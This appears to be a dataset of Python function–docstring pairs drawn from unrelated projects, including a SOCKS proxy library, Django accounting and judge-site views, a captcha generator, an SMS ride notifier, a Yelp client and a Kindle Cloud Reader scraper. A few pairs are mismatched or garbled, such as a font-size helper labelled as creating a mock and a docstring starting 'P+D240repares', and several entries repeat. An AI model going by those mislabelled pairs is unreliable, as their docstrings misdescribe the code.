1	def bind(self, *pos, **kw): proxy_type, proxy_addr, proxy_port, rdns, username, password = self.proxy if not proxy_type or self.type != socket.SOCK_DGRAM: return _orig_socket.bind(self, *pos, **kw) if self._proxyconn: raise socket.error(EINVAL, "Socket already bound to an address") if proxy_type != SOCKS5: msg = "UDP only supported by SOCKS5 proxy type" raise socket.error(EOPNOTSUPP, msg) _BaseSocket.bind(self, *pos, **kw) _, port = self.getsockname() dst = ("0", port) self._proxyconn = _orig_socket() proxy = self._proxy_addr() self._proxyconn.connect(proxy) UDP_ASSOCIATE = b"\x03" _, relay = self._SOCKS5_request(self._proxyconn, UDP_ASSOCIATE, dst) host, _ = proxy _, port = relay _BaseSocket.connect(self, (host, port)) self.proxy_sockname = ("0.0.0.0", 0)	Implements proxy connection for UDP sockets, which happens during the bind() phase.
1	def get_proxy_sockname(self): return self.proxy_sockname	Returns the bound IP address and port number at the proxy.
1	def _readall(self, file, count): data = b"" while len(data) < count: d = file.read(count - len(data)) if not d: raise GeneralProxyError("Connection closed unexpectedly") data += d return data	Receive EXACTLY the number of bytes requested from the file object. Blocks until the required number of bytes have been received.
1	def _negotiate_SOCKS5(self, *dest_addr): CONNECT = b"\x01" self.proxy_peername, self.proxy_sockname = self._SOCKS5_request(self, CONNECT, dest_addr)	Negotiates a stream connection through a SOCKS5 server.
2	def configuration(parent_package='',top_path=None): from numpy.distutils.misc_util import Configuration config = Configuration(None, parent_package, top_path) config.set_options(ignore_setup_xxx_py=True, assume_default_configuration=True, delegate_options_to_subpackages=True, quiet=True) config.add_subpackage('clawpack') config.get_version(os.path.join('clawpack','version.py')) return config	END BOILERPLATE ###.
1	def initialize_submodules(subpackages): if not os.path.exists('.git'): raise Exception("Developer setup requested but top-level clawpack" + \ " is not a git repository") for package in subpackages: if not os.path.exists(package) or not (os.listdir(package)): subprocess.check_call(['git', 'submodule', 'init', package]) fails = 0 while fails < 20 and subprocess.call(['git', 'submodule', 'update', package]): fails = fails+1 print("having difficulties updating submodules," + \ "waiting 5s and trying again [fail %d/20]" % fails) time.sleep(5) print("Git development environment initialized for:", package) @contextmanager	Clawpack developer environment setup. If user has a .git subdirectory, assume they want us to set up submodules for them. For each package in subpackages: if the package directory does not exist or is empty, calls:: git submodule init?git submodule update?with timeouts for update, which may be over a fickle remote connection.
1	def stdout_redirected(new_stdout='install.log'): old = os.dup(1) os.close(1) os.open(new_stdout, os.O_WRONLY | os.O_CREAT) try: yield None finally: os.close(1) os.dup2(old,1) os.close(old)	This redirects stdout for this processes and those forked from it. Avoids many pages of warnings generated by f2py being printed to the screen.
1	def save_signal(self): for user in self.unit.get_users(): user.clear_rights_cache()	Cleanup rights
1	def genericFormExtraInit(self, form, current_user, *args, **kwargs): from accounting_core.models import AccountCategory yeared_account_categories = AccountCategory.objects.filter(accounting_year=self.accounting_year) yeared_account_categories = filter(lambda qs: qs.get_children_categories().count() == 0, yeared_account_categories) ids_yac = map(lambda yac: yac.id, yeared_account_categories) form.fields['category'].queryset = AccountCategory.objects.filter(id__in=ids_yac)	Reduce the list of possible categories to the leaves of the hierarchical tree.
1	def genericFormExtraClean(self, data, form): from accounting_core.models import Account if Account.objects.exclude(pk=self.pk).filter(accounting_year=get_current_year(form.truffe_request), name=data['name']).count(): raise forms.ValidationError(_(u'Un compte de CG avec ce nom existe dj pour cette anne comptable.')) if Account.objects.exclude(pk=self.pk).filter(accounting_year=get_current_year(form.truffe_request), account_number=data['account_number']).count(): raise forms.ValidationError(_(u'Un compte de CG avec ce numro de compte existe dj pour cette anne comptable.')) if data['category'].accounting_year != get_current_year(form.truffe_request): raise forms.ValidationError(_(u'La catgorie choisie n\'appartient pas la bonne anne comptable.'))	Check that unique_together is fulfiled and that category is in the right accounting_year
1	def genericFormExtraInit(self, form, current_user, *args, **kwargs): from accounting_core.models import AccountCategory form.fields['parent_hierarchique'].queryset = AccountCategory.objects.filter(accounting_year=self.accounting_year)	Reduce the list of possible parents to those on the same accounting year.
1	def genericFormExtraClean(self, data, form): from accounting_core.models import AccountCategory if AccountCategory.objects.exclude(pk=self.pk).filter(accounting_year=get_current_year(form.truffe_request), name=data['name']).count(): raise forms.ValidationError(_(u'Une catgorie avec ce nom existe dj pour cette anne comptable.')) if data['parent_hierarchique'] and data['parent_hierarchique'].accounting_year != get_current_year(form.truffe_request): raise forms.ValidationError(_(u'La catgorie parente choisie n\'appartient pas la bonne anne comptable.'))	Check that unique_together is fulfiled
1	def get_children_categories(self): return self.accountcategory_set.order_by('order', 'name')	Return the categories whose parent is self.
1	def get_root_parent(self): if self.parent_hierarchique: return self.parent_hierarchique.get_root_parent() else: return self	Return the category at the root level
1	def get_accounts(self): return self.account_set.order_by('account_number')	Return the list of accounts whose category is self ordered by account number.
1	def rights_can_DISPLAY_LOG(self, user): return super(_AccountingError, self).rights_can_EDIT(user)	Always display log, even if current state dosen't allow edit
1	def rights_can_DISPLAY_LOG(self, user): return super(_AccountingLine, self).rights_can_EDIT(user)	Always display log, even if current state dosen't allow edit
1	def genericFormExtraInit(self, form, current_user, *args, **kwargs): if not self.rights_in_root_unit(current_user, 'SECRETARIAT'): del form.fields['card'] del form.fields['location'] del form.fields['remark_agepoly'] unit_users_pk = map(lambda user: user.pk, self.unit.users_with_access()) form.fields['responsible'].queryset = TruffeUser.objects.filter(pk__in=unit_users_pk).order_by('first_name', 'last_name')	Remove fields that should be edited by SECRETARIAT CDD only.
1	def genericFormExtraInit(self, form, current_user, *args, **kwargs): from accounting_tools.models import Withdrawal form.fields['withdrawal'] = forms.ModelChoiceField(queryset=Withdrawal.objects.order_by('-pk'), initial=self.proving_object, required=False, label=_(u'Retrait cash li')) for field in ['content_type', 'object_id']: del form.fields[field]	Set related object correctly.
1	def is_unit_validator(self, user): return self.rights_in_linked_unit(user, self.MetaRightsUnit.access)	Check if user is a validator for the step '1_unit_validable'.
1	def genericFormExtraClean(self, data, form): from accounting_core.models import CostCenter if CostCenter.objects.exclude(pk=self.pk).filter(accounting_year=get_current_year(form.truffe_request), name=data['name']).count(): raise forms.ValidationError(_(u'Un centre de cots avec ce nom existe dj pour cette anne comptable.')) if CostCenter.objects.exclude(pk=self.pk).filter(accounting_year=get_current_year(form.truffe_request), account_number=data['account_number']).count(): raise forms.ValidationError(_(u'Un centre de cots avec ce numro de compte existe dj pour cette anne comptable.'))	Check that unique_together is fulfiled
1	def genericFormExtraClean(self, data, form): from django import forms if 'display' in form.fields: if 'display' not in data or not data['display'].active or data['display'].deleted: raise forms.ValidationError(_('Affichage non disponible')) if not self.unit and not data['display'].allow_externals: raise forms.ValidationError(_('Affichage non disponible pour les externes')) else: raise forms.ValidationError(_(u'Il ne faut pas laisser de ligne vide !')) if 'start_date' in data and 'end_date' in data and data['start_date'] > data['end_date']: raise forms.ValidationError(_(u'La date de fin ne peut pas tre avant la date de dbut !'))	Check if selected displays are available
1	def is_unit_validator(self, user): return self.rights_in_linked_unit(user, self.MetaRightsUnit.access)	Check if user is a validator for the step '1_unit_validable'.
1	def genericFormExtraInit(self, form, current_user, *args, **kwargs): from accounting_core.models import Account, CostCenter form.fields['account'].queryset = Account.objects.filter(accounting_year=self.accounting_year).order_by('category__order') form.fields['cost_center_from'].queryset = CostCenter.objects.filter(accounting_year=self.accounting_year).order_by('account_number') form.fields['cost_center_to'].queryset = CostCenter.objects.filter(accounting_year=self.accounting_year).order_by('account_number')	Set querysets according to the selected accounting_year
1	class Order(BaseOrder): measurement = 'orders' @property def fields(self): size = self.data.get('size') or self.data.get('remaining_size') return { 'size': float(size) if size else None, 'price': float(self.data['price']), 'id': self.data['order_id'] } class Trade(BaseOrder):	Represents a coinbase order
1	class Trade(BaseOrder): measurement = 'trades' def __init__(self, data): super(Trade, self).__init__(data) self.tags = { 'type': 'uptick' if data['side'] == 'sell' else 'downtick', 'side': data['side'] } @property def fields(self): size = float(self.data['size']) price = float(self.data['price']) return { 'size': size, 'price': price, 'cost': size * price, 'id': self.data['trade_id'] } @asyncio.coroutine def coinbase_feed():	Represents a coinbase trade
1	def process_metrics_parameters(request_params): start = process_time_parameter(request_params, 'start') end = process_time_parameter(request_params, 'end') if not start and not end: raise e.InvalidParameters(errors=['start and end are required']) interval = request_params.get('interval') if interval: try: interval = parse_interval(interval) except: raise e.InvalidParameters( errors=['"%s" is an invalid interval' % interval]) order = request_params.get('order', 'desc') filters = {} for key in request_params.keys(): val = request_params[key] if key not in RESERVED_PARAMETERS: if val == 'true' or val == 'false': val = val == 'true' filters[key] = val return start, end, interval, order, filters	Processes the request's querystring arguments to pass to a view function
1	class Order(BaseOrder): measurement = 'orders' @property def fields(self): size = self.data.get('size') or self.data.get('remaining_size') return { 'size': float(size) if size else None, 'price': float(self.data['price']), 'id': self.data['order_id'] } class Trade(BaseOrder):	Represents a coinbase order
1	class Trade(BaseOrder): measurement = 'trades' def __init__(self, data): super(Trade, self).__init__(data) self.tags = { 'type': 'uptick' if data['side'] == 'sell' else 'downtick', 'side': data['side'] } @property def fields(self): size = float(self.data['size']) price = float(self.data['price']) return { 'size': size, 'price': price, 'cost': size * price, 'id': self.data['trade_id'] } @asyncio.coroutine def coinbase_feed():	Represents a coinbase trade
1	def process_metrics_parameters(request_params): start = process_time_parameter(request_params, 'start') end = process_time_parameter(request_params, 'end') if not start and not end: raise e.InvalidParameters(errors=['start and end are required']) interval = request_params.get('interval') if interval: try: interval = parse_interval(interval) except: raise e.InvalidParameters( errors=['"%s" is an invalid interval' % interval]) order = request_params.get('order', 'desc') filters = {} for key in request_params.keys(): val = request_params[key] if key not in RESERVED_PARAMETERS: if val == 'true' or val == 'false': val = val == 'true' filters[key] = val return start, end, interval, order, filters	Processes the request's querystring arguments to pass to a view function
1	class APIView(View): request_parsers = (JSONParser, URLEncodedParser) response_class = JSONResponse def _get_request_data(self, request): if request.method not in ["GET", "DELETE"]: body = request.body content_type = request.META.get("CONTENT_TYPE") if not content_type: raise ValueError("content_type is required") for parser in self.request_parsers: if content_type.startswith(parser.content_type): break else: raise ValueError("unknown content_type '%s'" % content_type) if body: return parser.parse(body) return {} return request.GET def response(self, data): return self.response_class.response(data) def success(self, data=None): return self.response({"error": None, "data": data}) def error(self, msg="error", err="error"): return self.response({"error": err, "data": msg}) def _serializer_error_to_str(self, errors): for k, v in errors.items(): if isinstance(v, list): return k, v[0] elif isinstance(v, OrderedDict): for _k, _v in v.items(): return self._serializer_error_to_str({_k: _v}) def invalid_serializer(self, serializer): k, v = self._serializer_error_to_str(serializer.errors) if k != "non_field_errors": return self.error(err="invalid-" + k, msg=k + ": " + v) else: return self.error(err="invalid-field", msg=v) def server_error(self): return self.error(err="server-error", msg="server error") def paginate_data(self, request, query_set, object_serializer=None): """ :param request: djangorequest :param query_set: django modelquery setlist like objects :param object_serializer: query set, None, query set :return: """ try: limit = int(request.GET.get("limit", "10")) except ValueError: limit = 10 if limit < 0 or limit > 250: limit = 10 try: offset = int(request.GET.get("offset", "0")) except ValueError: offset = 0 if offset < 0: offset = 0 results = query_set[offset:offset + limit] if object_serializer: count = query_set.count() results = object_serializer(results, many=True).data else: count = query_set.count() data = {"results": results, "total": count} return data def dispatch(self, request, *args, **kwargs): if self.request_parsers: try: request.data = self._get_request_data(self.request) except ValueError as e: return self.error(err="invalid-request", msg=str(e)) try: return super(APIView, self).dispatch(request, *args, **kwargs) except APIError as e: ret = {"msg": e.msg} if e.err: ret["err"] = e.err return self.error(**ret) except Exception as e: logger.exception(e) return self.server_error() class CSRFExemptAPIView(APIView):	Django view, django-rest-framework - request.datajsonurlencoded, dict - self.success, self.errorself.invalid_serializer, ,success/error - self.response django HttpResponse, self.response_class - parserequest_parser, jsonurlencoded,
1	def __init__(self, request): self.django_request = request self.session_key = "_django_captcha_key" self.captcha_expires_time = "_django_captcha_expires_time" self.img_width = 90 self.img_height = 30	
1	def get(self): background = (random.randrange(200, 255), random.randrange(200, 255), random.randrange(200, 255)) code_color = (random.randrange(0, 50), random.randrange(0, 50), random.randrange(0, 50), 255) font_path = os.path.join(os.path.normpath(os.path.dirname(__file__)), "timesbi.ttf") image = Image.new("RGB", (self.img_width, self.img_height), background) code = self._make_code() font_size = self._get_font_size(code) draw = ImageDraw.Draw(image) x = random.randrange(int(font_size * 0.3), int(font_size * 0.5)) for i in code: y = random.randrange(1, 7) font = ImageFont.truetype(font_path.replace("\\", "/"), font_size + random.randrange(-3, 7)) draw.text((x, y), i, font=font, fill=code_color) x += font_size * random.randrange(6, 8) / 10 self.django_request.session[self.session_key] = "".join(code) return image	bytes
1	def check(self, code): _code = self.django_request.session.get(self.session_key) or "" if not _code: return False expires_time = self.django_request.session.get(self.captcha_expires_time) or 0 del self.django_request.session[self.session_key] del self.django_request.session[self.captcha_expires_time] if _code.lower() == str(code).lower() and time.time() < expires_time: return True else: return False	
2	def _get_font_size(self, code): s1 = int(self.img_height * 0.8) s2 = int(self.img_width / len(code)) return int(min((s1, s2)) + max((s1, s2)) * 0.05)	Instantiate and record that a new mock has been created.
1	def _set_answer(self, answer): self.django_request.session[self.session_key] = str(answer) self.django_request.session[self.captcha_expires_time] = time.time() + 60	
1	def _make_code(self): string = random.sample("abcdefghkmnpqrstuvwxyzABCDEFGHGKMNOPQRSTUVWXYZ23456789", 4) self._set_answer("".join(string)) return string	
1	def post(self, request): data = request.data result = False if data.get("username"): try: user = User.objects.get(username=data["username"]) result = user.two_factor_auth except User.DoesNotExist: pass return self.success({"result": result})	Check TFA is required
1	def post(self, request): data = request.data try: contest = Contest.objects.get(id=data.pop("contest_id")) ensure_created_by(contest, request.user) data["contest"] = contest data["created_by"] = request.user except Contest.DoesNotExist: return self.error("Contest does not exist") announcement = ContestAnnouncement.objects.create(**data) return self.success(ContestAnnouncementSerializer(announcement).data)	Create one contest_announcement.
1	def put(self, request): data = request.data try: contest_announcement = ContestAnnouncement.objects.get(id=data.pop("id")) ensure_created_by(contest_announcement, request.user) except ContestAnnouncement.DoesNotExist: return self.error("Contest announcement does not exist") for k, v in data.items(): setattr(contest_announcement, k, v) contest_announcement.save() return self.success()	update contest_announcement
1	def delete(self, request): contest_announcement_id = request.GET.get("id") if contest_announcement_id: if request.user.is_admin(): ContestAnnouncement.objects.filter(id=contest_announcement_id, contest__created_by=request.user).delete() else: ContestAnnouncement.objects.filter(id=contest_announcement_id).delete() return self.success()	Delete one contest_announcement.
1	def get(self, request): contest_announcement_id = request.GET.get("id") if contest_announcement_id: try: contest_announcement = ContestAnnouncement.objects.get(id=contest_announcement_id) ensure_created_by(contest_announcement, request.user) return self.success(ContestAnnouncementSerializer(contest_announcement).data) except ContestAnnouncement.DoesNotExist: return self.error("Contest announcement does not exist") contest_id = request.GET.get("contest_id") if not contest_id: return self.error("Parameter error") contest_announcements = ContestAnnouncement.objects.filter(contest_id=contest_id) if request.user.is_admin(): contest_announcements = contest_announcements.filter(created_by=request.user) keyword = request.GET.get("keyword") if keyword: contest_announcements = contest_announcements.filter(title__contains=keyword) return self.success(ContestAnnouncementSerializer(contest_announcements, many=True).data)	Get one contest_announcement or contest_announcement list.
1	def delete(self, *args, **kwargs): self.deleted_ts = timezone.now() self.save()	Note that overriding this function will not have effect on bulk_delete(). ArchivableManager will take care of bulk_delete()
1	class ArchivableModel(models.Model): deleted_ts = models.DateTimeField( blank=True, null=True, verbose_name='Deleted timestamp', editable=False ) class Meta: abstract = True def __str__(self): if hasattr(self, 'name'): return self.name return models.Model.__str__(self) def force_delete(self, *args, **kwargs): models.Model.delete(self, *args, **kwargs) def delete(self, *args, **kwargs): ''' Note that overriding this function will not have effect on bulk_delete(). ArchivableManager will take care of bulk_delete() ''' self.deleted_ts = timezone.now() self.save()	An abstract model class for models that are not meant to be deleted. Calling the delete() function on such models will result in archiving, which sets deleted_ts to current timestamp. Usage: class MyModel(ArchivableModel): ...
1	def __init__(self, number): self.number = "+" + str(number)	Initilializes SMS
1	def send(self, body_text): message = client.sms.messages.create(body=str(body_text), to=self.number, from_="+13853557433") return message.sid	Sends SMS
1	def price(self): if self.start is None or self.end is None: return 0 lon1, lat1, lon2, lat2 = map(radians, [ float(self.start.longitude), float(self.start.latitude), float(self.end.longitude), float(self.end.latitude)]) # haversine formula dlon = lon2 - lon1 dlat = lat2 - lat1 a = sin(dlat / 2) ** 2 + cos(lat1) * cos(lat2) * sin(dlon / 2) ** 2 c = 2 * asin(sqrt(a)) km = 6367 * c return km * 200	Returns the price of the trip based on the distance of the trip.
1	def change_status(self, new_status): if new_status == 'PICKING UP' and self.trip_status.name == 'REQUESTED': print('sending confirmed text') send_confirmed(self.customer.phone_number) self.trip_status = TripStatus.objects.get(name='PICKING UP') if new_status == 'ARRIVED' and self.trip_status.name == 'PICKING UP': self.trip_status = TripStatus.objects.get(name='ARRIVED') print('send arrived text') send_arrived(self.customer.phone_number) if new_status == 'FINISHED' and self.trip_status.name == 'ARRIVED': self.trip_status = TripStatus.objects.get(name='FINISHED') self.save()	Change the status based on the status coming in and the previous status.
1	def update(self, instance, validated_data): return instance	Support writable nested fields. Supported:
1	def validate_trip_status(self, value): trip_status = value if not self.instance: return value if trip_status not in TripStatus.objects.all().values_list('name', flat=True): raise serializers.ValidationError('Not a valid status name.') self.instance.change_status(new_status=trip_status) return trip_status	If trip status comes in, call change_status.
1	def send_unconfirmed(user_number): status = None if user_number: sms = SMS(user_number) status = sms.send("A rider has requested a ride.") return status	Send a sms to the rider(s) phone number when a trip is created.
1	def send_confirmed(user_number): status = None if user_number: sms = SMS(user_number) status = sms.send("A rider has confirmed your trip request.") return status	Send a sms to the customers phone number when a trip is confirmed.
1	def send_arrived(user_number): status = None if user_number: sms = SMS(user_number) status = sms.send("Your rider has arrived at your pick-up location.") return status	Send a sms to the customers phone number when a rider has arrived at the pickup location.
1	def request(host, path, url_params=None): url_params = url_params or {} url = 'http://{0}{1}?'.format(host, urllib.quote(path.encode('utf8'))) consumer = oauth2.Consumer(CONSUMER_KEY, CONSUMER_SECRET) oauth_request = oauth2.Request(method="GET", url=url, parameters=url_params) oauth_request.update( { 'oauth_nonce': oauth2.generate_nonce(), 'oauth_timestamp': oauth2.generate_timestamp(), 'oauth_token': TOKEN, 'oauth_consumer_key': CONSUMER_KEY } ) token = oauth2.Token(TOKEN, TOKEN_SECRET) oauth_request.sign_request(oauth2.SignatureMethod_HMAC_SHA1(), consumer, token) signed_url = oauth_request.to_url() print u'Querying {0} ...'.format(url) conn = urllib2.urlopen(signed_url, None) try: response = json.loads(conn.read()) finally: conn.close() return response	P+D240repares OAuth authentication and sends the request to the API. Args: host (str): The domain host of the API. path (str): The path of the API after the domain. url_params (dict): An optional set of query parameters in the request. Returns: dict: The JSON response from the request. Raises: urllib2.HTTPError: An error occurs from the HTTP request.
1	def search(term, location): url_params = { 'term': term.replace(' ', '+'), 'location': location.replace(' ', '+'), 'limit': SEARCH_LIMIT } return request(API_HOST, SEARCH_PATH, url_params=url_params)	Query the Search API by a search term and location. Args: term (str): The search term passed to the API. location (str): The search location passed to the API. Returns: dict: The JSON response from the request.
1	def get_business(business_id): business_path = BUSINESS_PATH + business_id return request(API_HOST, business_path)	Query the Business API by a business ID. Args: business_id (str): The ID of the business to query. Returns: dict: The JSON response from the request.
1	def query_api(term, location): response = search(term, location) businesses = response.get('businesses') if not businesses: print u'No businesses for {0} in {1} found.'.format(term, location) return business_id = businesses[0]['id'] print u'{0} businesses found, querying business info for the top result "{1}" ...'.format( len(businesses), business_id ) response = get_business(business_id) print u'Result for business "{0}" found:'.format(business_id) pprint.pprint(response, indent=2)	Queries the API by the input values from the user. Args: term (str): The search term to query. location (str): The location of the business to query.
1	class CheckIP(SimpleTask): def __init__(self): SimpleTask.__init__(self, "CheckIP") self._counter = 0 def process(self, item): if self._counter <= 0: item.log_output('Checking IP address.') ip_set = set() ip_set.add(socket.gethostbyname('twitter.com')) ip_set.add(socket.gethostbyname('facebook.com')) ip_set.add(socket.gethostbyname('youtube.com')) ip_set.add(socket.gethostbyname('microsoft.com')) ip_set.add(socket.gethostbyname('icanhas.cheezburger.com')) ip_set.add(socket.gethostbyname('archiveteam.org')) if len(ip_set) != 6: item.log_output('Got IP addresses: {0}'.format(ip_set)) item.log_output( 'Are you behind a firewall/proxy? That is a big no-no!') raise Exception( 'Are you behind a firewall/proxy? That is a big no-no!') if self._counter <= 0: self._counter = 10 else: self._counter -= 1 class PrepareDirectories(SimpleTask):	Simple tasks (tasks that do not need any concurrency) are based on the SimpleTask class and have a process(item) method that is called for each item.
1	VERSION = "20150816.01"	Update this each time you make a non-cosmetic change. It will be added to the WARC files and reported to the tracker.
1	class PyTest(TestCommand): def finalize_options(self): TestCommand.finalize_options(self) self.test_args = [] self.test_suite = True def run_tests(self): import pytest errno = pytest.main([]) sys.exit(errno) import os	Overrides setup "test" command, taken from here: http://pytest.org/latest/goodpractises.html
1	def debug(self, immediate=False, *args, **kwargs): import _pytest.config capman = None if self._pluginmanager is not None: capman = self._pluginmanager.getplugin("capturemanager") if capman: capman.suspend_global_capture(in_=True) tw = _pytest.config.create_terminal_writer(self._config) tw.line() tw.sep(">", "Trepan set_trace (IO-capturing turned off)") self._pluginmanager.hook.pytest_enter_pdb() if immediate: kwargs['level'] = 1 kwargs['step_ignore'] = 0 else: if not 'level' in kwargs: kwargs['level'] = 0 if not 'step_ignore' in kwargs: kwargs['step_ignore'] = 2 trepan_debug(*args, **kwargs)	invoke Trepan debugging, dropping any I/O capturing. If you want to stop at the call before the next statement, set immediate=True. Set immediate=False will stop just before the subsequent statement which sometimes might be in another scope. You can also pass trepan.debug options. In particular immediate=True is the the same as arguments: level=1, step_count=0, and will override setting those; immediate=False sets level=0, step_count=2
1	class pytestTrepan: _pluginmanager = None _config = None def debug(self, immediate=False, *args, **kwargs): """invoke Trepan debugging, dropping any I/O capturing. If you want to stop at the call before the next statement, set immediate=True. Set immediate=False will stop just before the subsequent statement which sometimes might be in another scope. You can also pass trepan.debug options. In particular immediate=True is the the same as arguments: level=1, step_count=0, and will override setting those; immediate=False sets level=0, step_count=2 """ import _pytest.config capman = None if self._pluginmanager is not None: capman = self._pluginmanager.getplugin("capturemanager") if capman: capman.suspend_global_capture(in_=True) tw = _pytest.config.create_terminal_writer(self._config) tw.line() tw.sep(">", "Trepan set_trace (IO-capturing turned off)") self._pluginmanager.hook.pytest_enter_pdb() if immediate: kwargs['level'] = 1 kwargs['step_ignore'] = 0 else: if not 'level' in kwargs: kwargs['level'] = 0 if not 'step_ignore' in kwargs: kwargs['step_ignore'] = 2 trepan_debug(*args, **kwargs) class TrepanInvoke:	Pseudo Trepan that defers to the real trepan.
1	def pytest_addoption(parser): group = parser.getgroup("general") group._addoption('--trepan', action="store_true", dest="usetrepan", default=False, help="start the trepan Python debugger on errors.")	Adds option --trepan to py.test
1	def pytest_namespace(): return {'trepan': pytestTrepan().debug}	Allows user code to insert pytest.trepan() to enter the trepan debugger.
1	def pytest_configure(config): if config.getvalue("usetrepan"): config.pluginmanager.register(TrepanInvoke(), 'pdbinvoke') old = pytestTrepan._pluginmanager def fin(): pytestTrepan._pluginmanager = old pytestTrepan._config = None pytestTrepan._pluginmanager = config.pluginmanager pytestTrepan._config = config config._cleanup.append(fin)	Called to configure pytest when "pytest --trepan ... " is invoked
1	def _wait(self, timeout=10): return WebDriverWait(self, timeout=timeout)	Returns a `WebDriverWait` instance set to `timeout` seconds.
1	def _init_browser(self): self._to_reader_home() self._to_reader_frame() self._wait_for_js()	Initializes a browser and navigates to the KCR reader page.
1	def _create_browser(self):	Creates a new instance of the selenium driver.
1	def _to_reader_home(self): self.switch_to_default_content() self.get(_KindleCloudReaderBrowser._CLOUD_READER_URL) if self.title == u'Problem loading page': raise ConnectionError login_or_reader_loaded = lambda br: ( br.find_elements_by_id('amzn_kcr') or br.find_elements_by_id('KindleLibraryIFrame')) self._wait(5).until(login_or_reader_loaded) try: self._wait(5).until(lambda br: br.title == u'Amazon.com Sign In') except TimeoutException: raise BrowserError('Failed to load Kindle Cloud Reader.') else: self._login()	Navigate to the Cloud Reader library page. Raises: BrowserError: If the KCR homepage could not be loaded. ConnectionError: If there was a connection error.
1	def _login(self, max_tries=2): if not self.current_url.startswith(_KindleCloudReaderBrowser._SIGNIN_URL): raise BrowserError( 'Current url "%s" is not a signin url ("%s")' % (self.current_url, _KindleCloudReaderBrowser._SIGNIN_URL)) email_field_loaded = lambda br: br.find_elements_by_id('ap_email') self._wait().until(email_field_loaded) tries = 0 while tries < max_tries: email_elem = self.find_element_by_id('ap_email') email_elem.clear() email_elem.send_keys(self._uname) pword_elem = self.find_element_by_id('ap_password') pword_elem.clear() pword_elem.send_keys(self._pword) def creds_entered(_): email_ok = email_elem.get_attribute('value') == self._uname pword_ok = pword_elem.get_attribute('value') == self._pword return email_ok and pword_ok kcr_page_loaded = lambda br: br.title == u'Kindle Cloud Reader' try: self._wait(5).until(creds_entered) self.find_element_by_id('signInSubmit-input').click() self._wait(5).until(kcr_page_loaded) except TimeoutException: tries += 1 else: return raise LoginError	Logs in to Kindle Cloud Reader. Args: max_tries: The maximum number of login attempts that will be made. Raises: BrowserError: If method called when browser not at a signin URL. LoginError: If login unsuccessful after `max_tries` attempts.
1	def _to_reader_frame(self): reader_frame = 'KindleReaderIFrame' frame_loaded = lambda br: br.find_elements_by_id(reader_frame) self._wait().until(frame_loaded) self.switch_to.frame(reader_frame) reader_loaded = lambda br: br.find_elements_by_id('kindleReader_header') self._wait().until(reader_loaded)	Navigate to the KindleReader iframe.
1	def _wait_for_js(self): mod_mgr_script = ur"return window.hasOwnProperty('KindleModuleManager');" mod_mgr_loaded = lambda br: br.execute_script(mod_mgr_script) self._wait(5).until(mod_mgr_loaded) db_client_script = dedent(ur""" var done = arguments[0]; if (!window.hasOwnProperty('KindleModuleManager') || !KindleModuleManager .isModuleInitialized(Kindle.MODULE.DB_CLIENT)) { done(false); } else { KindleModuleManager .getModuleSync(Kindle.MODULE.DB_CLIENT) .getAppDb() .getAllBooks() .done(function(books) { done(!!books.length); }); } """) db_client_loaded = lambda br: br.execute_async_script(db_client_script) self._wait(5).until(db_client_loaded)	Wait for the Kindle Cloud Reader JS modules to initialize. These modules provide the interface used to execute API queries.
1	class APIError(Error): class ConnectionError(Error):	Indicates an error executing an API call.
1	class BrowserError(Error): class KindleBook(object):	Indicates a problem with the browser.
1	class ConnectionError(Error): class LoginError(Error):	Indicates an error connecting to a webpage.
1	class Error(Exception): class APIError(Error):	Base Lector error.
1	class KindleBook(object): def __init__(self, asin, title, authors=()): self.asin = unicode(asin) self.title = unicode(title) self.authors = tuple(unicode(author) for author in authors) def __str__(self): if not self.authors: ret = u'"{}"'.format(self.title) elif len(self.authors) == 1: ret = u'"{}" by {}'.format(self.title, self.authors[0]) elif len(self.authors) == 2: ret = u'"{}" by {} and {}'.format( self.title, self.authors[0], self.authors[1]) else: ret = u'"{}" by {}, and {}'.format( self.title, u', '.join(self.authors[:-1]), self.authors[-1]) return ret.encode('utf8') def __repr__(self): author_str = u', '.join(u'"%s"' % author for author in self.authors) return (u'Book(asin={}, title="{}", authors=[{}])' .format(self.asin, self.title, author_str) .encode('utf8')) class ReadingProgress(object):	A Kindle Book. Args: asin: The "Amazon Standard Item Number" of the book. Essentially a UUID for Kindle books. title: The book title authors: An iterable of the book's authors.
1	def get_book_metadata(self, asin): kbm = self._get_api_call('get_book_metadata', '"%s"' % asin) return KindleCloudReaderAPI._kbm_to_book(kbm)	Returns a book's metadata. Args: asin: The ASIN of the book to be queried. Returns: A `KindleBook` instance corresponding to the book associated with `asin`.
1	def get_library_metadata(self): return map(KindleCloudReaderAPI._kbm_to_book, self._get_api_call('get_library_metadata'))	Returns the metadata on all books in the kindle library. Returns: A list of `KindleBook` instances corresponding to the books in the current user's library.
1	def get_book_progress(self, asin): kbp = self._get_api_call('get_book_progress', '"%s"' % asin) return KindleCloudReaderAPI._kbp_to_progress(kbp)	Returns the progress data available for a book. NOTE: A summary of the two progress formats can be found in the docstring for `ReadingProgress`. Args: asin: The asin of the book to be queried. Returns: A `ReadingProgress` instance corresponding to the book associated with `asin`.
1	def get_library_progress(self): kbp_dict = self._get_api_call('get_library_progress') return {asin: KindleCloudReaderAPI._kbp_to_progress(kbp) for asin, kbp in kbp_dict.iteritems()}	Returns the reading progress for all books in the kindle library. Returns: A mapping of ASINs to `ReadingProgress` instances corresponding to the books in the current user's library.
1	def close(self): self._browser.quit()	End the browser session.
1	def _get_api_call(self, function_name, *args): api_call = dedent(""" var done = arguments[0]; KindleAPI.%(api_call)s(%(args)s).always(function(a) { done(a); }); """) % { 'api_call': function_name, 'args': ', '.join(args) } script = '\n'.join((api.API_SCRIPT, api_call)) try: return self._browser.execute_async_script(script) except TimeoutException: raise APIError	Runs an api call with javascript-formatted arguments. Args: function_name: The name of the KindleAPI call to run. *args: Javascript-formatted arguments to pass to the API call. Returns: The result of the API call. Raises: APIError: If the API call fails or times out.
1	def _kbm_to_book(kbm): return KindleBook(**kbm)	Converts a KindleBookMetadata object to a `KindleBook` instance. KindleBookMetadata is the Javascript object used by Kindle Cloud Reader to represent book metadata. Args: kbm: A KindleBookMetadata object. Returns: A KindleBook instance corresponding to the KindleBookMetadata param.
1	def _kbp_to_progress(kbp): return ReadingProgress(**kbp)	Converts a KindleBookProgress object to a `ReadingProgress` instance. KindleBookProgress is the Javascript object used by Kindle Cloud Reader to represent reading progress. Args: kbp: A KindleBookProgress object. Returns: A ReadingProgress instance constructed using the KindleBookMetadata param.
1	def get_instance(*args, **kwargs): inst = KindleCloudReaderAPI(*args, **kwargs) try: yield inst except Exception: raise finally: inst.close()	Context manager for an instance of `KindleCloudReaderAPI`.
1	def step_back(self, position=-1, mode=1): self.torr_str.seek(position, mode)	Step back, by default, 1 position relative to the current position.
